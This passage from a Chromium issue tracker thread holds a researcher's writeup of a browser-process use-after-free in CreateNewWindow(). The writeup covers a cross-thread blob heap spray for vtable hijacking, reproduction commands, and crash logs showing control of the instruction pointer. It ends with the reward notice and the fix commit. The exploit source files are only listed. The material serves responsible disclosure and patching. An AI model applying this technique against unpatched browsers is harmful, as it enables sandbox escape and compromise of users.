0e 000000d6`d75fde10 00007ff9`d491f5b7     chrome!blink::HTMLParserScriptRunner::ProcessScriptElement+0x1c4
0f 000000d6`d75fdee0 00007ff9`d492165e     chrome!blink::HTMLDocumentParser::PrepareToStopParsing+0x7d7
10 000000d6`d75fe130 00007ff9`cf3b863e     chrome!blink::HTMLDocumentParser::PrepareToStopParsing+0x287e
11 (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0x22 [D:\chromium\src\base\functional\callback.h @ 155] 
12 000000d6`d75fe1a0 00007ff9`cf3aa575     chrome!base::TaskAnnotator::RunTaskImpl+0x1ae [D:\chromium\src\base\task\common\task_annotator.cc @ 229] 
13 (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTask+0x63 [D:\chromium\src\base\task\common\task_annotator.h @ 112] 
14 (Inline Function) --------`--------     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x619 [D:\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 475] 
15 000000d6`d75fe240 00007ff9`cf41859f     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x6a5 [D:\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 346] 
16 000000d6`d75fe4b0 00007ff9`cf3ab156     chrome!base::MessagePumpDefault::Run+0xef [D:\chromium\src\base\message_loop\message_pump_default.cc @ 43] 
17 000000d6`d75fe5e0 00007ff9`cf3d95f0     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x126 [D:\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 650] 
18 000000d6`d75fe660 00007ff9`d3087aad     chrome!base::RunLoop::Run+0x2c0 [D:\chromium\src\base\run_loop.cc @ 137] 
19 000000d6`d75fe710 00007ff9`cd9f9d88     chrome!content::RendererMain+0x99d [D:\chromium\src\content\renderer\renderer_main.cc @ 372] 
1a 000000d6`d75fe9a0 00007ff9`cd9fad9c     chrome!content::RunOtherNamedProcessTypeMain+0x298 [D:\chromium\src\content\app\content_main_runner_impl.cc @ 762] 
1b 000000d6`d75fee30 00007ff9`cd9f923c     chrome!content::ContentMainRunnerImpl::Run+0x2dc [D:\chromium\src\content\app\content_main_runner_impl.cc @ 1152] 
1c (Inline Function) --------`--------     chrome!content::RunContentProcess+0x5a0 [D:\chromium\src\content\app\content_main.cc @ 358] 
1d 000000d6`d75fefa0 00007ff9`c8130a7a     chrome!content::ContentMain+0x62c [D:\chromium\src\content\app\content_main.cc @ 371] 
1e 000000d6`d75ff0c0 00007ff6`f071fe49     chrome!ChromeMain+0x3ea [D:\chromium\src\chrome\app\chrome_main.cc @ 193] 
1f 000000d6`d75ff370 00007ff6`f071ebfa     chrome_exe!MainDllLoader::Launch+0x539 [D:\chromium\src\chrome\app\main_dll_loader_win.cc @ 204] 
20 000000d6`d75ff600 00007ff6`f09ac912     chrome_exe!wWinMain+0x4ba [D:\chromium\src\chrome\app\chrome_exe_main_win.cc @ 351] 
21 (Inline Function) --------`--------     chrome_exe!invoke_main+0x21 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118] 
22 000000d6`d75ff9e0 00007ffa`aa85e8d7     chrome_exe!__scrt_common_main_seh+0x106 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
23 000000d6`d75ffa20 00007ffa`aba8c48c     KERNEL32!BaseThreadInitThunk+0x17
24 000000d6`d75ffa50 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

```

### je...@gmail.com (2026-04-08)

Hi, this exploit was written on my Windows 10 machine. Since it requires ROP to bypass CFG, I’m not entirely sure how to make it fully reproducible for you.

My idea is to provide an new exploit for PC hijacking, and the remaining parts should be sufficient to prove the full chain by referring to my Windows screen recording and writeup.

### je...@gmail.com (2026-04-08)

# Step 1: Cross-Thread Blob Heap Spray — Reproduction

## Vulnerability

Use-after-free in `RenderFrameHostImpl::CreateNewWindow()`. When a compromised renderer sends `SINGLETON_TAB` disposition and the target URL matches an existing tab, `Navigate()` destroys the new `WebContents` but `ShowCreatedWindow()` returns non-null (the existing tab). The caller then dereferences the freed `RenderFrameHostImpl` via `GetView()` virtual call.

- Freed object: `RenderFrameHostImpl` (5464 bytes, PA bucket 5632)
- UAF site: `new_main_rfh->GetView()` — vtable call at offset `+0xa0`
- Protection: MiraclePtr NOT PROTECTED (local `auto*` variables)

## Spray Mechanism

Blob allocations via `BlobRegistry::Register()` run on the browser IO thread, not the UI thread. Since RFHI (5464B) lands in PA bucket 5632 (>512B threshold), it bypasses ThreadCache and goes through the central freelist shared across all threads. 5500-byte blobs land in the same bucket 5632 and can reclaim the freed RFHI slot from the IO thread while the UI thread is blocked on the sync IPC.

12 cross-origin spray windows ensure 12 independent renderer processes continuously submitting blob allocations.

## Environment

- OS: Linux x64
- Chromium commit: `cdd1f63c02a65c37ccdb85e85b25dbec456c9914`
- Build: `out/release` (Release mode, no ASAN)
- args.gn:
  ```
  is_debug = false
  dcheck_always_on = false
  
  ```
- Patches: **renderer only** (`content/renderer/render_frame_impl.cc`), zero browser-side modifications

## Reproduction

```
# 1. Apply renderer patch
cd ~/chromium/src
git apply step1-heap-spray/patches/renderer.patch

# 2. Build
autoninja -C out/release chrome

# 3. Start 13 HTTP servers (ports 8800-8812)
python3 step1-heap-spray/exploit/run_servers.py

# 4. Launch Chrome (no special flags needed)
DISPLAY=:0 out/release/chrome \
  --user-data-dir=/tmp/pwn-$(date +%s) \
  http://localhost:8800/index.html

```
## Expected Result

Browser process crashes within ~10-30 seconds:

```
Received signal 11 SEGV_MAPERR 4141414141e1

```

Crash address breakdown:

- Spray fills freed RFHI with `0x0000414141414141` at every 8-byte offset
- `GetView()` reads vtable pointer = `*(rfhi+0)` = `0x0000414141414141`
- Virtual call dispatches through `*(vtable + 0xa0)` = `*(0x4141414141e1)`
- Address `0x4141414141e1` is unmapped → `SEGV_MAPERR`

This confirms full control over the vtable pointer and the ability to redirect execution to an arbitrary address via vtable hijacking.

Hit rate: **4/5 (80%)** across 5 consecutive runs.

## Crash Stack (symbolized, spray hit)

```
Received signal 11 SEGV_MAPERR 4141414141e1
#0 0x55d60d7d7d72 base::debug::CollectStackTrace()
#1 0x55d60d7c430e base::debug::StackTrace::StackTrace()
#2 0x55d60d7d77e8 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f2429a42520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#4 0x55d60adf9ce4 content::RenderFrameHostImpl::CreateNewWindow()
#5 0x55d6090ad0fa content::mojom::FrameHostStubDispatch::AcceptWithResponder()
#6 0x55d60d6d3520 mojo::InterfaceEndpointClient::HandleValidatedMessage()
#7 0x55d60d6da4d1 mojo::MessageDispatcher::Accept()
#8 0x55d60d6d4d8f mojo::InterfaceEndpointClient::HandleIncomingMessage()
#9 0x55d60e84b8c5 IPC::ChannelAssociatedGroupController::AcceptSyncMessage()
#10 0x55d60e84bf92 base::internal::Invoker<>::RunOnce()
#11 0x55d60d75ff00 base::TaskAnnotator::RunTaskImpl()
#12 0x55d60d77ed06 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()
#13 0x55d60d77e73b base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
#14 0x55d60d7f0ca0 base::MessagePumpGlib::HandleDispatch()
#15 0x55d60d7f17ad base::(anonymous namespace)::WorkSourceDispatch()
#16 0x7f242a876d3b g_main_context_dispatch
#17 0x7f242a8cc258 (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0+0xab257)
#18 0x7f242a8743e3 g_main_context_iteration
#19 0x55d60d7f0ec3 base::MessagePumpGlib::Run()
#20 0x55d60d77f4ea base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()
#21 0x55d60d73d3e1 base::RunLoop::Run()
#22 0x55d60a82364d content::BrowserMainLoop::RunMainMessageLoop()
#23 0x55d60a825322 content::BrowserMainRunnerImpl::Run()
#24 0x55d60a820650 content::BrowserMain()
#25 0x55d60c5c9a1b content::RunBrowserProcessMain()
#26 0x55d60c5cb1c7 content::ContentMainRunnerImpl::RunBrowser()
#27 0x55d60c5cafc3 content::ContentMainRunnerImpl::Run()
#28 0x55d60c5c8615 content::RunContentProcess()
#29 0x55d60c5c8847 content::ContentMain()
#30 0x55d607aab45e ChromeMain
#31 0x7f2429a29d90 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
#32 0x7f2429a29e40 __libc_start_main
#33 0x55d607aab02a _start

Registers:
   r8: 00003c200021c8a8  r9: 000000000007ffd0 r10: 0000000000000000 r11: 0000000000000000
  r12: 00003c240152cb00 r13: 00003c2402f0fa20 r14: 00003c2401873c28 r15: 00003c24153d8400
   di: 00003c24153d8400  si: 00000000000000cd  bp: 00007ffc1fbd3e10  bx: 00003c240017c200
   dx: 0000000000000030  ax: 0000414141414141  cx: 00003c20002f2be0  sp: 00007ffc1fbd3850
   ip: 000055a46429ece4 efl: 0000000000010206 cgf: 002b000000000033 erf: 0000000000000004
  trp: 000000000000000e msk: 0000000000000000 cr2: 00004141414141e1

Key:
  rax: 0000414141414141  — vtable pointer read from sprayed RFHI slot (attacker-controlled)
  cr2: 00004141414141e1  — faulting address = rax + 0xa0 (vtable dispatch offset)
  r15/rdi: 00003c24153d8400  — new_main_rfh (dangling pointer to freed RFHI)
  ip: CreateNewWindow+0xbff4  — faulting instruction: call *0xa0(%rax)

```

Crash at `#4 content::RenderFrameHostImpl::CreateNewWindow()` — the faulting instruction is `call *0xa0(%rax)` where `rax = 0x0000414141414141` (attacker-controlled vtable pointer from blob spray data).

## Files

```
step1-heap-spray/
├── exploit/
│   ├── index.html       # Main page: opens 12 spray windows, triggers UAF
│   ├── spray.html       # Spray page: 5500B blobs, never freed
│   └── run_servers.py   # Starts 13 HTTP servers on ports 8800-8812
├── patches/
│   └── renderer.patch   # Renderer-only patch (allow_popup + SINGLETON_TAB)
└── README.md            # This file

```

### je...@gmail.com (2026-04-08)

I also tested it on Mac ARM64, but the success rate is lower compared to Linux. You can try about 10 times. I suspect it's related to the memory pressure I applied, but PC hijacking is indeed possible.

```
➜  src git:(cdd1f63c02a65) ✗ out/release/Chromium.app/Contents/MacOS/Chromium --user-data-dir=/tmp/pwn-$(date +%s) http://localhost:8800/index.html
Trying to load the allocator multiple times. This is *not* supported.
[39282:91064944:0408/233731.260340:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.260378:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.260392:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.260484:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.260890:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.261188:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.261398:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.261622:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.261802:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.261983:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
[39282:91064944:0408/233731.270973:ERROR:mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:748] Message 2 rejected by interface blink.mojom.Widget
Received signal 11 SEGV_ACCERR 4141414141e1
 [0x00011ffad6a4]
 [0x00011ffa05e8]
 [0x00011ffad5f8]
 [0x00019a9396a4]
 [0x00011d8dfc00]
 [0x00011bc26cc8]
 [0x00011fec79dc]
 [0x00011feccf68]
 [0x00011fec8fa0]
 [0x000120eacaa4]
 [0x000120ead188]
 [0x00011ff4ad68]
 [0x00011ff67430]
 [0x00011ff66ff4]
 [0x00011ffb870c]
 [0x00011ffb3b78]
 [0x00011ffb7e3c]
 [0x00019a9eab14]
 [0x00019a9eaaa8]
 [0x00019a9ea814]
 [0x00019a9e9468]
 [0x00019a9e8a98]
 [0x0001a648b27c]
 [0x0001a648e4e8]
 [0x0001a6619484]
 [0x00019e90da34]
 [0x00019f2ac940]
 [0x00011fa84d74]
 [0x00011ffb3b78]
 [0x00011fa84cbc]
 [0x00019e900be4]
 [0x00011ffb8e7c]
 [0x00011ffb77bc]
 [0x00011ff67a94]
 [0x00011ff2be7c]
 [0x00011d39ce20]
 [0x00011d39e674]
 [0x00011d39a528]
 [0x00011eebc83c]
 [0x00011eebdce4]
 [0x00011eebd7d4]
 [0x00011eebbd98]
 [0x00011eebbf5c]
 [0x00011aa74efc]
 [0x000100e148d8]
 [0x00019a55eb98]
[end of stack trace]
[0408/233737.239811:WARNING:third_party/crashpad/crashpad/util/process/process_memory_mac.cc:94] mach_vm_read(0x16efe8000, 0x8000): (os/kern) invalid address (1)
[1]    39282 segmentation fault  out/release/Chromium.app/Contents/MacOS/Chromium
➜  src git:(cdd1f63c02a65) ✗ cat out/release/args.gn
is_debug = false
dcheck_always_on = false

```

### sp...@google.com (2026-04-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $90000.00 for this report.

Rationale for this decision:
Controlled r/w


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-05-29)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-05-29)

1. <https://chromium-review.git.corp.google.com/c/chromium/src/+/7822040?tab=checks>
2. Medium - There were some conflicts.
3. 146
4. Yes.

### ch...@google.com (2026-06-05)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2026-06-09)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Gyuyoung Kim [qkim@google.com](mailto:qkim@google.com)  

Link:    <https://chromium-review.googlesource.com/7822040>

[M144-LTS] Fix CreateNewWindow() to correctly handle a reused tab

---


Expand for full commit details
```
     
    Under normal circumstances, a non-null return value from 
    `ShowCreatedWindow()` will return the WebContents that was created by 
    the earlier call to `CreateNewWindow()`. However, under certain 
    circumstances `ShowCreatedWindow()` will return a different pre-existing 
    WebContents and allow the just-created WebContents to expire, along with 
    its frame tree node, widget host, and frame host. 
     
    This CL ensures that the code doesn't rely on any of the newly-created 
    objects after the call to `ShowCreatedWindow()`, and instead uses the 
    normal accessors on WebContents to retrieve them. 
     
    (cherry picked from commit 3c20517b961d59dea34098ef7e9fd4ca955eb081) 
     
    Bug: 487338366 
    Change-Id: I84a5c5cf7f395d708baf71c6a43b39e4099f61ad 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7610581 
    Reviewed-by: Charlie Reis <creis@chromium.org> 
    Commit-Queue: Stefan Zager <szager@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1590960} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7822040 
    Reviewed-by: Artem Sumaneev <asumaneev@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Stefan Zager <szager@chromium.org> 
    Owners-Override: Artem Sumaneev <asumaneev@google.com> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4968} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `content/browser/renderer_host/render_frame_host_impl.cc`

---

Hash: [0f7e9295fb5ad7788756a1f5ede1d046dd5b394c](https://chromiumdash.appspot.com/commit/0f7e9295fb5ad7788756a1f5ede1d046dd5b394c)  

Date: Tue Jun 9 02:52:17 2026


---

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/487338366)*
